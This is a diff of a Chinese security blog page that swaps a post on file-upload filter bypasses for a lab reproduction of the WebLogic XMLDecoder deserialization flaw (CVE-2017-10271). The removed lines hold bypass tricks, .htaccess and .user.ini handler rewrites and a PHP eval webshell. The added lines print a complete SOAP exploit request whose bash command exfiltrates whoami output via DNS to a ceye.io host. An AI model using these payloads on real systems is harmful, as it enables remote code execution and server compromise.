@@ -3,23 +3,24 @@
 <head>
   <meta charset="utf-8">
   
-  <title>文件上传绕过 | Archimesan</title>
+  <title>WebLogic XMLDecoder反序列化漏洞复现 | Archimesan</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="常见的文件上传绕过归纳">
+  <meta name="description" content="CVE-2017-10271">
 <meta name="keywords" content="常见漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="文件上传绕过">
-<meta property="og:url" content="http://archimesan.me/2017/12/18/文件上传绕过/index.html">
+<meta property="og:title" content="WebLogic XMLDecoder反序列化漏洞复现">
+<meta property="og:url" content="http://archimesan.me/2018/02/03/WebLogic XMLDecoder 反序列化漏洞复现/index.html">
 <meta property="og:site_name" content="Archimesan">
-<meta property="og:description" content="常见的文件上传绕过归纳">
-<meta property="og:image" content="http://archimesan.me/2017/12/18/文件上传绕过/1.png">
-<meta property="og:image" content="http://archimesan.me/2017/12/18/文件上传绕过/2.png">
-<meta property="og:image" content="http://archimesan.me/2017/12/18/文件上传绕过/3.png">
-<meta property="og:updated_time" content="2017-12-19T02:49:48.041Z">
+<meta property="og:description" content="CVE-2017-10271">
+<meta property="og:image" content="http://archimesan.me/2018/02/03/WebLogic%20XMLDecoder%20反序列化漏洞复现/1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/03/WebLogic%20XMLDecoder%20反序列化漏洞复现/3.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/03/WebLogic%20XMLDecoder%20反序列化漏洞复现/4.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/03/WebLogic%20XMLDecoder%20反序列化漏洞复现/2.png">
+<meta property="og:updated_time" content="2018-02-07T09:01:55.544Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="文件上传绕过">
-<meta name="twitter:description" content="常见的文件上传绕过归纳">
-<meta name="twitter:image" content="http://archimesan.me/2017/12/18/文件上传绕过/1.png">
+<meta name="twitter:title" content="WebLogic XMLDecoder反序列化漏洞复现">
+<meta name="twitter:description" content="CVE-2017-10271">
+<meta name="twitter:image" content="http://archimesan.me/2018/02/03/WebLogic%20XMLDecoder%20反序列化漏洞复现/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Archimesan" type="application/atom+xml">
   
@@ -229,11 +230,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-文件上传绕过" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-WebLogic XMLDecoder 反序列化漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/12/18/文件上传绕过/" class="article-date">
-      <time datetime="2017-12-18T02:07:36.000Z" itemprop="datePublished">2017-12-18</time>
+      <a href="/2018/02/03/WebLogic XMLDecoder 反序列化漏洞复现/" class="article-date">
+      <time datetime="2018-02-03T08:36:08.000Z" itemprop="datePublished">2018-02-03</time>
 </a>
     </div>
   
@@ -246,7 +247,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      文件上传绕过
+      WebLogic XMLDecoder反序列化漏洞复现
     </h1>
   
 
@@ -267,43 +268,26 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>常见的文件上传绕过归纳</p>
+        <p>CVE-2017-10271</p>
 <a id="more"></a>
-<h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p>1）、绕过 JavaScript 代码检测</p>
-<p>一般情况下 选择文件还没点击上传 就出错<br>直接用 burpsuite 抓包 上传 jpg 后缀改成 php 后缀即可</p>
-<p>2）、MIME 类型绕过</p>
-<p>上传 php 后缀  改 Content-Type 即可  改成图片类型 image/jpeg  image/gif</p>
-<p>3）、目录路径检测</p>
-<p>%00 截断   通过抓包截断将 evil.php.jpg 后面的一个.换成 0x00<br>或者通过抓包将 evil.php .gif 后面的空格改成 00 即可</p>
-<p>example:</p>
+<p>Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的 HTTP 请求，就可以拿到目标服务器的权限。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>  Oracle WebLogic Server 10.3.6.0.0版本</p>
+<p>  Oracle WebLogic Server 12.1.3.0.0版本</p>
+<p>  Oracle WebLogic Server 12.2.1.1.0版本</p>
+<h1 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h1><h2 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br></pre></td></tr></table></figure>
+<p>编译及启动测试环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<p>访问 <a href="http://127.0.0.1:7001/wls-wsat/CoordinatorPortType" target="_blank" rel="noopener">http://127.0.0.1:7001/wls-wsat/CoordinatorPortType</a></p>
 <p><img src="1.png" alt=""></p>
-<p><img src="2.png" alt=""></p>
+<p>存在该漏洞组件</p>
+<p>用burpsuite抓包访问</p>
+<p>改包：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.30.146:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; rv:11.0) like Gecko</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Accept-Language: zh-cn</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 646</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span><br><span class="line">  &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">&lt;java version=<span class="string">"1.8.0_131"</span> class=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span><br><span class="line">  &lt;void class=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">&lt;array class=<span class="string">"java.lang.String"</span> length=<span class="string">"3"</span>&gt;</span><br><span class="line">  &lt;void index=<span class="string">"0"</span>&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">  &lt;void index=<span class="string">"1"</span>&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">  &lt;void index=<span class="string">"2"</span>&gt;</span><br><span class="line">&lt;string&gt;ping `whoami`.ip.port.eu04a0.ceye.io&lt;/string&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">  &lt;void method=<span class="string">"start"</span>/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">  &lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">  &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
 <p><img src="3.png" alt=""></p>
-<p>4）、文件扩展名检测绕过（黑名单）</p>
-<p>文件大小写 Asp phP ASASPP phphpp<br>Asp: asa cer cdx<br>Aspx: ashx<br>PHP: php3、php4、php5、phtml、pht</p>
-<p>5）、文件内容检测</p>
-<p>头文件加 GIF89a 后面加一句话，其他名字可以改成 php。或者直接在一个正常的 gif 后面加一句话<br>6）、上传覆盖 .htaccess 文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"x.jpg"</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后在相同目录下上传 x.jpg  就可以解析 php 了。</p>
-<p>或者<br>后面就上传了一个 .htaccess 文件里面只有一句。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .abc</span><br></pre></td></tr></table></figure></p>
-<p>之后，把 php 后门改成 xx.abc 上传上去就可以执行了。</p>
-<p>7）、上传.user.ini</p>
-<p>如果文件夹下有<br>Index.php  .user.ini  1.gif<br>我们在 .user.ini 里面写入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=/tmp/01.gif</span><br></pre></td></tr></table></figure></p>
-<p>在 1.gif 写入 php 一句话  这样访问 php 文件即可  不需要重启 apache</p>
-<p>修改 php.ini<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=/tmp/01.gif   不过需要重启apache服务器</span><br></pre></td></tr></table></figure></p>
-<p>8）、配合文件包含漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(<span class="string">'x.jpg'</span>);?&gt;</span><br><span class="line">x.jpg写入一句话&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;  即可<span class="string">'</span></span><br></pre></td></tr></table></figure></p>
-<p>9）、解析漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">01、 IIS 6.0</span><br><span class="line">shell.asp;1.jpg</span><br><span class="line">shell.asp/1.jpg</span><br><span class="line">02、IIS 7 or Nginx</span><br><span class="line">shell.jpg/x.php</span><br><span class="line">shell.jpg%00.php</span><br><span class="line">03、Apache2</span><br><span class="line">shell.php.bak</span><br><span class="line">Shell.php.rar</span><br></pre></td></tr></table></figure></p>
-<p>10）、其他绕过</p>
-<p>01.上传 123.php:jpg，会生成 123.php 空文件，然后上传 123.&lt;&lt;&lt;，即可覆盖 123.php，把 Shell 内容写入 123.php 文件。</p>
-<p>02.直接上传 Shell.php::$DATA</p>
-<p>03.用 Burpsuite 拦截 将上传文件名改成 Shell.php%81 即可。</p>
-<h2 id="上传漏洞防护"><a href="#上传漏洞防护" class="headerlink" title="上传漏洞防护"></a>上传漏洞防护</h2><p>1）、文件上传的目录设置为不可执行</p>
-<p>只要 web 容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</p>
-<p>2）、判断文件类型</p>
-<p>在判断文件类型时，可以结合使用 MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者 resize 函数，在处理图片的同时破坏图片中可能包含的 HTML 代码。</p>
-<p>3）、使用随机数改写文件名和文件路径</p>
-<p>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像 shell.php.rar.rar 和 crossdomain.xml 这种文件，都将因为重命名而无法攻击。</p>
-<p>4）、单独设置文件服务器的域名</p>
-<p>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传 crossdomain.xml、上传包含 Javascript 的 XSS 利用等问题将得到解决。</p>
+<p>查看ceye平台的DNS查询记录，发现服务器成功执行whoami命令并将结果拼接到ping命令中执行，用户名成功返回到DNS查询记录中：</p>
+<p><img src="4.png" alt=""></p>
+<p>ps:</p>
+<p>使用ceye平台查看DNS查询记录<br>网站地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ceye.io/profile</span><br></pre></td></tr></table></figure></p>
+<p><img src="2.png" alt=""></p>
 
       
       
@@ -359,13 +343,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/12/18/文件上传绕过/">文件上传绕过</a></p>
+        <p><span>本文标题:</span><a href="/2018/02/03/WebLogic XMLDecoder 反序列化漏洞复现/">WebLogic XMLDecoder反序列化漏洞复现</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Archimesan 的个人博客">Archimesan</a></p>
-        <p><span>发布时间:</span>2017年12月18日 - 10时07分</p>
-        <p><span>最后更新:</span>2017年12月19日 - 10时49分</p>
+        <p><span>发布时间:</span>2018年02月03日 - 16时36分</p>
+        <p><span>最后更新:</span>2018年02月07日 - 17时01分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/12/18/文件上传绕过/" title="文件上传绕过">http://archimesan.me/2017/12/18/文件上传绕过/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://archimesan.me/2017/12/18/文件上传绕过/　　作者: Archimesan" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/02/03/WebLogic XMLDecoder 反序列化漏洞复现/" title="WebLogic XMLDecoder反序列化漏洞复现">http://archimesan.me/2018/02/03/WebLogic XMLDecoder 反序列化漏洞复现/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://archimesan.me/2018/02/03/WebLogic XMLDecoder 反序列化漏洞复现/　　作者: Archimesan" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -378,18 +362,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2017/12/19/文件包含漏洞/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/02/04/Firefox渗透插件—Web渗透必备工具/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          文件包含漏洞
+          Firefox渗透插件—Web渗透必备工具
         
       </div>
     </a>
   
   
-    <a href="/2017/12/17/XSS归纳/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">XSS归纳</div>
+    <a href="/2018/02/02/weblogic ssrf 漏洞复现/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">weblogic ssrf 漏洞复现</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -400,7 +384,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#上传绕过"><span class="toc-number">1.</span> <span class="toc-text">上传绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传漏洞防护"><span class="toc-number">2.</span> <span class="toc-text">上传漏洞防护</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#影响范围"><span class="toc-number">1.</span> <span class="toc-text">影响范围</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#测试环境搭建"><span class="toc-number"></span> <span class="toc-text">测试环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#docker搭建"><span class="toc-number">1.</span> <span class="toc-text">docker搭建</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -466,13 +450,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/12/19/文件包含漏洞/" title="上一篇: 文件包含漏洞">
+            <a href="/2018/02/04/Firefox渗透插件—Web渗透必备工具/" title="上一篇: Firefox渗透插件—Web渗透必备工具">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/12/17/XSS归纳/" title="下一篇: XSS归纳">
+            <a href="/2018/02/02/weblogic ssrf 漏洞复现/" title="下一篇: weblogic ssrf 漏洞复现">
                 <i class="fa fa-angle-right"></i>
             </a>
         
